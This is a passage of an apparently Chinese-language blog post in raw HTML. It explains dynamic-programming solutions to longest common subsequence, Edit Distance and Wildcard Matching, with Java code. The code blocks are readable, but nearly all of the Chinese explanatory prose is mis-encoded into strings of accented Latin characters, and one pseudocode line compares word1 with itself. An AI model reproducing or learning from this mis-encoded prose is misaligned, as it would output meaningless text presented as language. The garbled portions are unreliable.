- 1] + 1)</span><br><span class="line"></span><br><span class="line">å› ä¸º dp[i - 1][j - 1] + 1 &gt;= dp[i - 1][j] &amp;&amp; dp[i - 1][j - 1] + 1 &gt;= dp[i][j - 1]</span><br><span class="line">æ‰€ä»¥ç¬¬äºŒé¡¹å¯ä»¥åŒ–ç®€ï¼š</span><br><span class="line"></span><br><span class="line">å¦‚æœ str1(i) == str2(j):</span><br><span class="line">dp[i][j] = dp[i - 1][j - 1] + 1</span><br></pre></td></tr></table></figure><p>è®²é“ç†ï¼Œç¬¬äºŒæ¬¡åšçš„æ—¶å€™ä¸æ˜ç™½ä¸ºä»€ä¹ˆå’Œdp[i - 1][j - 1]æœ‰å…³ã€‚</p><p>å…¶å®æ˜¯è¿™æ ·ï¼Œæ¯”å¦‚è¯´æˆ‘ä»¬æ¯”abcå’Œaccï¼Œè¦ä¹ˆæœ€é•¿çš„é•¿åº¦æ˜¯abå’ŒacåŸºç¡€ä¸Š+1ï¼Œè¦ä¹ˆæ˜¯abcå’Œacï¼Œè¦ä¹ˆæ˜¯accå’Œabã€‚å› ä¸ºaccå’Œabcä»¥åŠacå’Œabcçš„åŒ¹é…é•¿åº¦æ˜¯ä¸€æ ·çš„ã€‚æ‰€ä»¥abcå’Œaccä¸èƒ½æ˜¯acåŸºç¡€ä¸Š+1ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">longestCommonSubsequence</span><span class="params">(String text1, String text2)</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">length1</span> <span class="operator">=</span> text1.length();</span><br><span class="line">    <span class="type">int</span> <span class="variable">length2</span> <span class="operator">=</span> text2.length();</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span>[][] dp = <span class="keyword">new</span> <span class="title class_">int</span>[length1 + <span class="number">1</span>][length2 + <span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span>[] textArr1 = text1.toCharArray();</span><br><span class="line">    <span class="type">char</span>[] textArr2 = text2.toCharArray();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt;= length1; ++i) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">1</span>; j &lt;= length2; ++j) &#123;</span><br><span class="line">            <span class="keyword">if</span> (textArr1[i - <span class="number">1</span>] == textArr2[j - <span class="number">1</span>]) &#123;</span><br><span class="line">                dp[i][j] = dp[i - <span class="number">1</span>][j - <span class="number">1</span>] + <span class="number">1</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                dp[i][j] = Math.max(dp[i - <span class="number">1</span>][j], dp[i][j - <span class="number">1</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> dp[length1][length2];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¼˜åŒ–åï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">longestCommonSubsequence</span><span class="params">(String s1, String s2)</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">m</span> <span class="operator">=</span> s1.length(), n = s2.length();</span><br><span class="line">    <span class="keyword">if</span> (m &lt; n)  <span class="keyword">return</span> longestCommonSubsequence(s2, s1);</span><br><span class="line">    <span class="type">int</span>[][] dp = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">2</span>][n + <span class="number">1</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>, k = <span class="number">1</span>; i &lt; m; ++i, k ^= <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; n; ++j)</span><br><span class="line">            <span class="keyword">if</span> (s1.charAt(i) == s2.charAt(j)) dp[k][j + <span class="number">1</span>] = <span class="number">1</span> + dp[k ^ <span class="number">1</span>][j];</span><br><span class="line">            <span class="keyword">else</span> dp[k][j + <span class="number">1</span>] = Math.max(dp[k ^ <span class="number">1</span>][j + <span class="number">1</span>], dp[k][j]);</span><br><span class="line">    <span class="keyword">return</span> dp[m % <span class="number">2</span>][n];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><font color="red">^æ˜¯äº¦æˆ–</font></p><h2><span id="72-edit-distance">72. Edit Distance âˆš</span></h2><p>ç»™å®šä¸¤ä¸ªå•è¯ <em>word1</em> å’Œ <em>word2</em>ï¼Œè®¡ç®—å‡ºå°† <em>word1</em> è½¬æ¢æˆ <em>word2</em> æ‰€ä½¿ç”¨çš„æœ€å°‘æ“ä½œæ•° ã€‚</p><p>ä½ å¯ä»¥å¯¹ä¸€ä¸ªå•è¯è¿›è¡Œå¦‚ä¸‹ä¸‰ç§æ“ä½œï¼š</p><p>Â·  æ’å…¥ä¸€ä¸ªå­—ç¬¦</p><p>Â·  åˆ é™¤ä¸€ä¸ªå­—ç¬¦</p><p>Â·  æ›¿æ¢ä¸€ä¸ªå­—ç¬¦</p><p><strong>ç¤ºä¾‹</strong> <strong>1:</strong></p><p>è¾“å…¥: word1 &#x3D; â€œhorseâ€, word2 &#x3D; â€œrosâ€<br> è¾“å‡º: 3<br> è§£é‡Š:<br> horse -&gt; rorse (å°† â€˜hâ€™ æ›¿æ¢ä¸º â€˜râ€™)<br> rorse -&gt; rose (åˆ é™¤ â€˜râ€™)<br> rose -&gt; ros (åˆ é™¤ â€˜eâ€™)</p><p><strong>ç¤ºä¾‹</strong> <strong>2:</strong></p><p>è¾“å…¥: word1 &#x3D; â€œintentionâ€, word2 &#x3D; â€œexecutionâ€<br> è¾“å‡º: 5<br> è§£é‡Š:<br> intention -&gt; inention (åˆ é™¤ â€˜tâ€™)<br> inention -&gt; enention (å°† â€˜iâ€™ æ›¿æ¢ä¸º â€˜eâ€™)<br> enention -&gt; exention (å°† â€˜nâ€™ æ›¿æ¢ä¸º â€˜xâ€™)<br> exention -&gt; exection (å°† â€˜nâ€™ æ›¿æ¢ä¸º â€˜câ€™)<br> exection -&gt; execution (æ’å…¥ â€˜uâ€™)</p><p>æ±‚ä»€ä¹ˆå°±è®¾ä»€ä¹ˆ</p><p>Dp[i][j]è®¾ä¸ºword1 çš„å‰iä¸ªå­—ç¬¦å’Œword2çš„å‰jä¸ªå­—ç¬¦è½¬æ¢ä¸ºç›¸åŒå­—ç¬¦ä¸²çš„æœ€å°è´¹ç”¨</p><p>åˆå§‹åŒ–æ¡ä»¶çŸ©é˜µï¼ˆxè½´è®¾ä¸ºiï¼Œyè½´ä¸ºjï¼‰</p><p>å› ä¸ºnull-&gt;null h o r s eåˆ†åˆ«æ˜¯0 1 2 3 4 5</p><p>ä¸”null-&gt;null r o s åˆ†åˆ«æ˜¯ 0 1 2 3</p><p><img src="/2020/03/25/dp/clip_image001-1585225322024.png"></p><p><strong>Hå’ŒR</strong></p><p><img src="/2020/03/25/dp/clip_image002.png"></p><p>æ­¤æ—¶é»„è‰²æ ¼å­çš„å€¼ç›¸å½“äºæ˜¯æŠŠhæ›¿æ¢ræ˜¯æœ€å°çš„</p><p>Min(dp[i-1][j],dp[i][j-1],dp[i-1][j-1])+1</p><p>å› æ­¤dp[i-1][j-1]+1ä»£è¡¨æ›¿æ¢æ“ä½œ</p><p><strong>HO</strong>å’ŒR-&gt;ä¾èµ–ä»¥ä¸Šä¸€æ­¥çš„å˜åŒ–ç»“æœ**-&gt;RO**å’ŒR</p><p><img src="/2020/03/25/dp/clip_image003.png"></p><p>æ­¤æ—¶å¯ä»¥æ˜¯å°†oåˆ é™¤ dp[i-1][j]+1(i-1å°±æ˜¯åˆ é™¤i)æˆ–è€…æ˜¯å°†oæ›¿æ¢æˆnull</p><p><img src="/2020/03/25/dp/clip_image004.png"></p><p>æ­¤æ—¶å¯ä»¥å°†oæ’å…¥dp[i][j-1]+1(æ’å…¥ä¹Ÿç›¸å½“äºåˆ é™¤ç¬¬jä¸ªå…ƒç´ )</p><p>å› æ­¤æˆ‘ä»¬å¯ä»¥å¾—åˆ°</p><p>If(word1[i]&#x3D;&#x3D;word1[j])</p><p>â€‹    Dp[i][j]&#x3D;dp[i-1][j-1]</p><p>Else</p><p>â€‹    Dp[i][j]&#x3D;Min(dp[i-1][j],dp[i][j-1],dp[i-1][j-1])+1;</p><table><thead><tr><th><strong>0</strong></th><th><strong>1</strong></th><th><strong>2</strong></th><th><strong>3</strong></th><th><strong>4</strong></th><th><strong>5</strong></th></tr></thead><tbody><tr><td><strong>1</strong></td><td>1</td><td>2</td><td>2</td><td>3</td><td>4</td></tr><tr><td><strong>2</strong></td><td>2</td><td>1</td><td>2</td><td>3</td><td>4</td></tr><tr><td><strong>3</strong></td><td>3</td><td>2</td><td>2</td><td>2</td><td>3</td></tr></tbody></table><p>æ¯æ¬¡preä¸€å¼€å§‹è‚¯å®šæ˜¯dp[0],ç„¶åæ˜¯dp[1]â€¦dp[m],å¾ªç¯äº†ä¸€éå</p><p>åˆæ˜¯ä»dp[0]å¼€å§‹ã€‚å› ä¸ºå¾ªç¯æ²¡æœ‰æ”¹å˜dp[0]çš„å€¼ï¼Œå› æ­¤éœ€è¦æ”¹å˜ã€‚ï¼ˆåœ¨äºŒç»´é‡Œé¢å¯ä»¥åˆå§‹åŒ–dp[i][0]ï¼‰ï¼Œåœ¨ä¸€ç»´çš„é‡Œé¢å¿…é¡»æ‰‹åŠ¨åˆå§‹åŒ–ã€‚</p><p>å…¶å®ä»å¦å¤–ä¸€ä¸ªè§’åº¦å»æƒ³é—®é¢˜ï¼Œé¢˜ç›®å’Œä½ è¯´äº†å¢åˆ æ”¹éƒ½è¡Œã€‚å› æ­¤ä½ å¯ä»¥ä¸ç”¨é¢˜ç›®çš„ä¾‹å­è‡ªå·±æƒ³ä¾‹å­ï¼Œç„¶åå»æ¨å‡ºé‡Œé¢çš„å…³ç³»æ¯”å¦‚è¯´acå’Œacdå°±å¯ä»¥æ¨å‡ºå¢åˆ ï¼ˆè¿˜æœ‰ç›¸ç­‰ï¼‰çš„æƒ…å†µï¼Œç„¶åadå’Œacå°±å¯ä»¥æ¨å‡ºæ”¹çš„æƒ…å†µã€‚é¢˜ç›®ä¾‹å­å¾€å¾€æ²¡é‚£ä¹ˆå¥½ä¸€çœ¼çœ‹å‡ºå…¶ä¸­çš„å…³ç³»ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">minDistance</span><span class="params">(String word1, String word2)</span> &#123;</span><br><span class="line">    <span class="type">char</span>[] w1=word1.toCharArray();</span><br><span class="line">    <span class="type">char</span>[] w2=word2.toCharArray();</span><br><span class="line">    <span class="type">int</span> n=w1.length,m=w2.length;</span><br><span class="line">    <span class="type">int</span>[][] dp = <span class="keyword">new</span> <span class="title class_">int</span>[n+<span class="number">1</span>][m+<span class="number">1</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt;= n; i++)   dp[i][<span class="number">0</span>]=i;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt;= m; i++)   dp[<span class="number">0</span>][i]=i;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt;=n ; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">1</span>; j &lt;=m ; j++) &#123;</span><br><span class="line">            <span class="keyword">if</span>(w1[i-<span class="number">1</span>]==w2[j-<span class="number">1</span>])&#123;</span><br><span class="line">                dp[i][j]=dp[i-<span class="number">1</span>][j-<span class="number">1</span>];</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                dp[i][j]=Math.min(Math.min(dp[i-<span class="number">1</span>][j],dp[i][j-<span class="number">1</span>]),dp[i-<span class="number">1</span>][j-<span class="number">1</span>])+<span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> dp[n][m];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é™ç»´æ‰“å‡»</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">minDistance</span><span class="params">(String word1, String word2)</span> &#123;</span><br><span class="line">    <span class="type">char</span>[] w1=word1.toCharArray();</span><br><span class="line">    <span class="type">char</span>[] w2=word2.toCharArray();</span><br><span class="line">    <span class="type">int</span> n=w1.length,m=w2.length;</span><br><span class="line">    <span class="type">int</span>[] dp = <span class="keyword">new</span> <span class="title class_">int</span>[m+<span class="number">1</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt;= m; i++)   dp[i]=i;</span><br><span class="line">    <span class="type">int</span> tmp=<span class="number">0</span>,pre=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt;=n ; i++) &#123;</span><br><span class="line">        pre = dp[<span class="number">0</span>];</span><br><span class="line">        dp[<span class="number">0</span>] = i;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">1</span>; j &lt;=m ; j++) &#123;</span><br><span class="line">            tmp=dp[j];</span><br><span class="line">            <span class="keyword">if</span>(w1[i-<span class="number">1</span>]==w2[j-<span class="number">1</span>])&#123;</span><br><span class="line">                dp[j]=pre;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                dp[j]=Math.min(Math.min(dp[j],dp[j-<span class="number">1</span>]),pre)+<span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            pre=tmp;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> dp[m];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2><span id="44-wildcard-matching-">44. Wildcard Matching -</span></h2><p>ç»™å®šä¸€ä¸ªå­—ç¬¦ä¸² (s) å’Œä¸€ä¸ªå­—ç¬¦æ¨¡å¼ (p) ï¼Œå®ç°ä¸€ä¸ªæ”¯æŒ â€˜?â€™ å’Œ â€˜*â€™ çš„é€šé…ç¬¦åŒ¹é…ã€‚</p><p>â€˜?â€™ å¯ä»¥åŒ¹é…ä»»ä½•å•ä¸ªå­—ç¬¦ã€‚<br> â€˜*â€™ å¯ä»¥åŒ¹é…ä»»æ„å­—ç¬¦ä¸²ï¼ˆåŒ…æ‹¬ç©ºå­—ç¬¦ä¸²ï¼‰ã€‚</p><p>ä¸¤ä¸ªå­—ç¬¦ä¸²<strong>å®Œå…¨åŒ¹é…</strong>æ‰ç®—åŒ¹é…æˆåŠŸã€‚</p><p><strong>è¯´æ˜</strong>:</p><p>Â·  s å¯èƒ½ä¸ºç©ºï¼Œä¸”åªåŒ…å«ä» a-z çš„å°å†™å­—æ¯ã€‚</p><p>Â·  p å¯èƒ½ä¸ºç©ºï¼Œä¸”åªåŒ…å«ä» a-z çš„å°å†™å­—æ¯ï¼Œä»¥åŠå­—ç¬¦ ? å’Œ *ã€‚</p><p><strong>ç¤ºä¾‹</strong> <strong>1:</strong></p><p>è¾“å…¥:<br> s &#x3D; â€œaaâ€<br> p &#x3D; â€œaâ€<br> è¾“å‡º: false<br> è§£é‡Š: â€œaâ€ æ— æ³•åŒ¹é… â€œaaâ€ æ•´ä¸ªå­—ç¬¦ä¸²ã€‚</p><p><strong>ç¤ºä¾‹</strong> <strong>2:</strong></p><p>è¾“å…¥:<br> s &#x3D; â€œaaâ€<br> p &#x3D; â€œ<em>â€œ<br> è¾“å‡º: true<br> è§£é‡Š: â€˜</em>â€˜ å¯ä»¥åŒ¹é…ä»»æ„å­—ç¬¦ä¸²ã€‚</p><p><strong>ç¤ºä¾‹</strong> <strong>3:</strong></p><p>è¾“å…¥:<br> s &#x3D; â€œcbâ€<br> p &#x3D; â€œ?aâ€<br> è¾“å‡º: false<br> è§£é‡Š: â€˜?â€™ å¯ä»¥åŒ¹é… â€˜câ€™, ä½†ç¬¬äºŒä¸ª â€˜aâ€™ æ— æ³•åŒ¹é… â€˜bâ€™ã€‚</p><p><strong>ç¤ºä¾‹</strong> <strong>4:</strong></p><p>è¾“å…¥:<br> s &#x3D; â€œadcebâ€<br> p &#x3D; â€œ<em>a</em>bâ€<br> è¾“å‡º: true<br> è§£é‡Š: ç¬¬ä¸€ä¸ª â€˜<em>â€˜ å¯ä»¥åŒ¹é…ç©ºå­—ç¬¦ä¸², ç¬¬äºŒä¸ª â€˜</em>â€˜ å¯ä»¥åŒ¹é…å­—ç¬¦ä¸² â€œdceâ€.</p><p><strong>ç¤ºä¾‹</strong> <strong>5:</strong></p><p>è¾“å…¥:<br> s &#x3D; â€œacdcbâ€<br> p &#x3D; â€œa*c?bâ€<br> è¾“å…¥: false</p><p><img src="/2020/03/25/dp/clip_image001-1585225470642.png"></p><p>é¢˜ç›®ç»™å®šä¸¤ä¸ªå­—ç¬¦ä¸²ï¼Œä¸€ä¸ªå­—ç¬¦ä¸²æ˜¯åŒ¹é…ä¸²ï¼Œé™¤äº†å°å†™å­—æ¯å¤–ï¼ŒåŒ¹é…ä¸²é‡Œé¢è¿˜åŒ…å« * å’Œ ? è¿™ä¸¤ä¸ªç‰¹æ®Šå­—ç¬¦ï¼Œå¦ä¸€ä¸ªæ˜¯æ™®é€šå­—ç¬¦ä¸²ï¼Œé‡Œé¢åªåŒ…å«å°å†™å­—æ¯ã€‚</p><p>é¢˜ç›®é—®è¿™ä¸ªæ™®é€šå­—ç¬¦ä¸²æ˜¯å¦å’ŒåŒ¹é…å­—ç¬¦ä¸²ç›¸åŒ¹é…ï¼ŒåŒ¹é…è§„åˆ™æ˜¯ ? å¯ä»¥åŒ¹é…å•ä¸ªå­—ç¬¦ï¼Œ* å¯ä»¥åŒ¹é…ä¸€ä¸ªåŒºé—´ï¼Œä¹Ÿå°±æ˜¯å¤šä¸ªå­—ç¬¦ï¼Œå½“ç„¶ä¹Ÿå¯ä»¥åŒ¹é… 0 ä¸ªå­—ç¬¦ï¼Œä¹Ÿå°±æ˜¯ç©ºä¸²ã€‚</p><p>ä¾ç„¶æ˜¯å››ä¸ªæ­¥éª¤èµ°ä¸€éï¼š</p><p>Â·  é—®é¢˜æ‹†è§£</p><p>åšå¤šäº†ï¼Œä½ å‘ç°è¿™ç§é—®é¢˜å…¶å®éƒ½æ˜¯ä¸€ä¸ªå¥—è·¯ï¼Œè€æ ·å­ï¼Œæˆ‘ä»¬è¿˜æ˜¯æ ¹æ®æˆ‘ä»¬è¦æ±‚è§£çš„é—®é¢˜å»çœ‹å’Œå…¶ç›´æ¥ç›¸å…³çš„å­é—®é¢˜ï¼Œæˆ‘ä»¬éœ€è¦æ±‚è§£çš„é—®é¢˜æ˜¯ pattern(0â€¦m) å’Œ str(0â€¦n) æ˜¯å¦åŒ¹é…ï¼Œ<strong>è¿™é‡Œçš„æ ¸å¿ƒä¾ç„¶æ˜¯å­—ç¬¦ä¹‹é—´çš„æ¯”è¾ƒï¼Œä½†æ˜¯å’Œä¹‹å‰ä¸åŒçš„æ˜¯ï¼Œè¿™ä¸ªæ¯”è¾ƒä¸ä»…ä»…æ˜¯çœ‹ä¸¤ä¸ªå­—ç¬¦ç›¸ä¸ç›¸ç­‰ï¼Œå®ƒè¿˜æœ‰äº†ä¸€å®šçš„åŒ¹é…è§„åˆ™åœ¨é‡Œé¢</strong>ï¼Œé‚£æˆ‘ä»¬å°±ä¾æ¬¡æšä¸¾è®¨è®ºä¸‹ï¼š</p><p>pattern(m) &#x3D;&#x3D; str(n):<br> é—®é¢˜æ‹†è§£æˆçœ‹å­é—®é¢˜ pattern(0â€¦m-1) å’Œ str(0â€¦n-1) æ˜¯å¦åŒ¹é…</p><p>pattern(m) &#x3D;&#x3D; ?:<br> é—®é¢˜æ‹†è§£æˆçœ‹å­é—®é¢˜ pattern(0â€¦m-1) å’Œ str(0â€¦n-1) æ˜¯å¦åŒ¹é…</p><p><font color="blue">pattern(m) &#x3D;&#x3D; *:å¯ä»¥åŒ¹é…ç©ºä¸²ã€ä»¥åŠä»»æ„å¤šä¸ªå­—ç¬¦</font></p><p>å½“ * åŒ¹é…ç©ºä¸²æ—¶ï¼šé—®é¢˜æ‹†è§£æˆçœ‹å­é—®é¢˜ pattern(0â€¦m-1) å’Œ str(0â€¦n) æ˜¯å¦åŒ¹é…</p><p>å½“ * åŒ¹é…ä»»æ„å­—ç¬¦æ—¶ï¼šé—®é¢˜æ‹†è§£æˆçœ‹å­é—®é¢˜ pattern(0â€¦m) å’Œ str(0â€¦n-1) æ˜¯å¦åŒ¹é…</p><p>è¿™é‡Œè§£é‡Šä¸€ä¸‹ï¼Œ<em>åŒ¹é…ä»»æ„å¤šä¸ªå­—ç¬¦æ„å‘³ç€ä¹‹å‰çš„å­é—®é¢˜ä¹Ÿå¯ä»¥ä½¿ç”¨å½“å‰çš„</em>ï¼Œä¹Ÿå°±æ˜¯ç”¨ pattern(m) æ¥è¿›è¡ŒåŒ¹é…ï¼Œå› æ­¤ï¼Œå½“å‰é—®é¢˜å¯ä»¥æ‹†è§£æˆå­é—®é¢˜ pattern(0â€¦m) å’Œ str(0â€¦n-1) æ˜¯å¦åŒ¹é…ï¼Œä½ å‘ç°å¼„æ¥å¼„å»ï¼Œå­é—®é¢˜ä¾ç„¶æ˜¯é‚£ä¸‰ä¸ªï¼š</p><p>Â·  pattern(0â€¦m-1) å’Œ str(0â€¦n-1) æ˜¯å¦åŒ¹é…</p><p>Â·  pattern(0â€¦m-1) å’Œ str(0â€¦n) æ˜¯å¦åŒ¹é…</p><p>Â·  pattern(0â€¦m) å’Œ str(0â€¦n-1) æ˜¯å¦åŒ¹é…</p><p>ä¸çŸ¥é“ä½ æ˜¯å¦å‘ç°äº†å­—ç¬¦åŒ¹é…ç±»åŠ¨æ€è§„åˆ’é—®é¢˜çš„å…±æ€§ï¼Œå¦‚æœæ˜¯ç”»è¡¨æ ¼ï¼Œä½ åªéœ€è¦å…³æ³¨å½“å‰æ ¼å­çš„<font color="orange"> <strong>å·¦è¾¹ã€ä¸Šè¾¹ã€å·¦ä¸Š</strong></font> è¿™ä¸‰ä¸ªä½ç½®çš„ç›¸é‚»å…ƒç´ ï¼Œå› ä¸ºè¡¨æ ¼æœ‰å®é™…æ•°æ®åšè¾…åŠ©ï¼Œæ‰€ä»¥ç”»è¡¨æ ¼æœ‰æ—¶å¯ä»¥å¸®åŠ©ä½ æ‰¾åˆ°é—®é¢˜ä¸å­é—®é¢˜ä¹‹é—´çš„è”ç³»ã€‚</p><p>Â·  çŠ¶æ€å®šä¹‰</p><p>è¿˜æ˜¯è€æ ·å­ï¼Œdp[i][j] è¡¨ç¤ºçš„å°±æ˜¯é—®é¢˜ pattern(0â€¦i) å’Œ str(0â€¦j) çš„ç­”æ¡ˆï¼Œç›´æ¥è¯´å°±æ˜¯ pattern(0â€¦i) å’Œ str(0â€¦j) æ˜¯å¦åŒ¹é…</p><p>Â·  é€’æ¨æ–¹ç¨‹</p><p>æŠŠä¹‹å‰ â€œé—®é¢˜æ‹†è§£â€ ä¸­çš„æ–‡å­—æè¿°è½¬æ¢æˆçŠ¶æ€çš„è¡¨è¾¾å¼å°±æ˜¯é€’æ¨æ–¹ç¨‹ï¼š</p><p>pattern(i) &#x3D;&#x3D; str(j) || pattern(i) &#x3D;&#x3D; â€˜?â€™:<br> dp[i][j] &#x3D; dp[i - 1][j - 1]</p><p> pattern(i) &#x3D;&#x3D; â€˜*â€™:<br> dp[i][j] &#x3D; dp[i - 1][j] || dp[i][j - 1]</p><p>Â·  å®ç°</p><p>è¿™ç±»é—®é¢˜çš„çŠ¶æ€æ•°ç»„å¾€å¾€éœ€è¦å¤šå¼€ä¸€æ ¼ï¼Œä¸»è¦æ˜¯ä¸ºäº†è€ƒè™‘ç©ºä¸²çš„æƒ…å†µï¼Œè¿™é‡Œæˆ‘å°±ä¸èµ˜è¿°äº†ã€‚</p><p>æˆ‘æƒ³è¯´çš„æ˜¯ï¼Œå…³äºåˆå§‹åŒ–çš„éƒ¨åˆ†ï¼Œå¦‚æœ str æ˜¯ç©ºçš„ï¼Œpattern æœ€å‰é¢æœ‰ *ï¼Œå› ä¸º * æ˜¯å¯ä»¥åŒ¹é…ç©ºä¸²çš„ï¼Œå› æ­¤è¿™ä¸ªä¹Ÿéœ€è¦è®°å½•ä¸€ä¸‹ï¼Œåè¿‡æ¥ï¼Œå¦‚æœ pattern æ˜¯ç©ºçš„ï¼Œstr åªè¦ä¸æ˜¯ç©ºçš„å°±æ— æ³•åŒ¹é…ï¼Œè¿™é‡Œå°±ä¸éœ€è¦ç‰¹åˆ«è®°å½•ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isMatch</span><span class="params">(String s, String p)</span> &#123;</span><br><span class="line">    <span class="type">char</span>[] sArr = s.toCharArray();</span><br><span class="line">    <span class="type">char</span>[] pArr = p.toCharArray();</span><br><span class="line">   <span class="type">int</span> n=pArr.length,m=sArr.length;</span><br><span class="line">    <span class="type">boolean</span>[][] dp = <span class="keyword">new</span> <span class="title class_">boolean</span>[n + <span class="number">1</span>][m + <span class="number">1</span>];</span><br><span class="line">    dp[<span class="number">0</span>][<span class="number">0</span>]=<span class="literal">true</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//ç±»ä¼¼p=&quot;**a&quot; s=&quot;a&quot;æ¡ä»¶ä¸‹        </span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt;= n; ++i) &#123;</span><br><span class="line">        <span class="keyword">if</span> (pArr[i - <span class="number">1</span>] != <span class="string">&#x27;*&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            dp[i][<span class="number">0</span>] = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt;=n; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">1</span>; j &lt;=m ; j++) &#123;</span><br><span class="line">            <span class="keyword">if</span>(pArr[i-<span class="number">1</span>]==sArr[j-<span class="number">1</span>]||pArr[i-<span class="number">1</span>]==<span class="string">&#x27;?&#x27;</span>) dp[i][j]=dp[i-<span class="number">1</span>][j-<span class="number">1</span>];</span><br><span class="line">            <span class="keyword">if</span>(pArr[i-<span class="number">1</span>]==<span class="string">&#x27;*&#x27;</span>) dp[i][j] = dp[i-<span 